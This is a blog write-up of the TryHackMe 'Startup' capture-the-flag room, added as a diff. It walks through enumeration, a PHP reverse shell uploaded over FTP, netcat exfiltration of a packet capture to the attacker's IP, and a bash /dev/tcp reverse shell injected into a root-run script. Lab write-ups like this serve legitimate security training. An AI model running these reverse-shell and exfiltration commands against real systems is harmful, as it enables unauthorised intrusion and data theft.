@@ -1,0 +1,83 @@
+---
+title: "Startup TryHackMe"
+date: "08-08-2021"
+author: "Reda BELHAJ"
+summary: "We are Spice Hut, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Created by elbee"
+tags: ["Tryhackme", "Ctf", "Writeup"]
+image: "/images/Startup/dndjk3g.jpg"
+---
+Let’s take a look at the [Startup CTF](https://tryhackme.com/room/startup) on TryHackMe.
+
+## Enumeration
+### Nmap Scan
+The first step of my enumeration was a scan with **nmap**. by the command:
+
+```
+sudo nmap 10.10.172.186
+```
+![Nmap](/images/Startup/nmap.jpg)
+
+The “Nmap Output” displayed `3` services running under ports 21, 22 and 80.
+
+### Gobuster Scan
+I next decided to run a gobuster scan on the webserver to see if there were any interesting hidden directories, by the command:
+![Gobuster](/images/Startup/gobuster.jpg)
+
+## Exploiting
+Let's take a closer look at the /files directory:
+![Files](/images/Startup/files.jpg)
+
+In the `/files` we found a directory and two files: a text file and an image. The same files found on in the the FTP server:
+![FTP](/images/Startup/ftp.jpg)
+
+So Now I decided to put a reverse shell file inside the ftp directory to access the machine, With the use of [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) I changed the ip address and the port:
+![Payload](/images/Startup/payload.jpg)
+
+And I started a netcat listener on the local machine before clicking the php-reverse-shell.php:
+
+```
+nc -nlvp 4444
+```
+
+And we found the special `recipe.txt`
+## User Flag
+Also I found an uncommon directory `/incidents` with a .pcapng file and with this method I download the file:
+
+- In the local machine:
+
+```
+nc -lvp 1234 > suspicious.pcapng
+```
+
+- In the victim machine:
+
+```
+nc 10.8.174.180 1234 < suspicious.pcapng
+```
+Then I analyzed the packets and I found:
+![Pcap](/images/Startup/wireshark.jpg)
+
+With The credentials that I've found I tried to swith into user `lennie`:
+
+```
+su lennie
+```
+
+```
+THM{***********************************}
+```
+## Root Flag
+In the home directory I searched inside the scripts dir an I've found two scripts one have :
+![Planner](/images/Startup/planner.jpg)
+
+And the script called another file that is execute: `/etc/print.sh`, The file also is owned by user lennie So I want to create a reverse shell using [GTFObins](https://gtfobins.github.io/gtfobins/bash/#reverse-shell) and I add this to the script:
+
+```
+bash -c 'exec bash -i &>/dev/tcp/10.8.174.180/4444 <&1'
+```
+
+Bingo I'm now a root:
+
+```
+THM{***********************************}
+```
